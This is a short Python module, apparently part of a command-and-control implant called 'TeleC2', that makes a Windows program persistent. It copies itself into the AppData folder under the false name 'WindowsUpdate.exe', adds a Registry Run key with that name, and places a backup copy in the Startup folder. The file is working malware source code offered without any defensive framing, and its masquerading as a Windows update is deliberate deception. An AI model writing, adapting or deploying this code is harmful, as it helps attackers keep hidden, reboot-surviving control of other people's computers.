# persistence.py – Registry + Startup folder persistence for TeleC2
import os
import sys
import shutil
import winreg
from pathlib import Path

def install_persistence():
    """Copy self to AppData and add Registry Run key."""
    try:
        # Destination: %APPDATA%\Microsoft\Windows\WindowsUpdate.exe
        appdata = os.environ.get('APPDATA')
        dest_dir = Path(appdata) / 'Microsoft' / 'Windows'
        dest_dir.mkdir(parents=True, exist_ok=True)
        dest_path = dest_dir / 'WindowsUpdate.exe'

        current_exe = Path(sys.executable if getattr(sys, 'frozen', False) else __file__)
        if current_exe.resolve() != dest_path.resolve():
            shutil.copy2(current_exe, dest_path)

        # Registry Run key
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                             r'Software\Microsoft\Windows\CurrentVersion\Run',
                             0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, 'WindowsUpdate', 0, winreg.REG_SZ, str(dest_path))
        winreg.CloseKey(key)

        # Startup folder backup
        startup = Path(os.environ['APPDATA']) / r'Microsoft\Windows\Start Menu\Programs\Startup'
        shutil.copy2(current_exe, startup / 'WindowsUpdate.exe')

        return True
    except Exception:
        return False
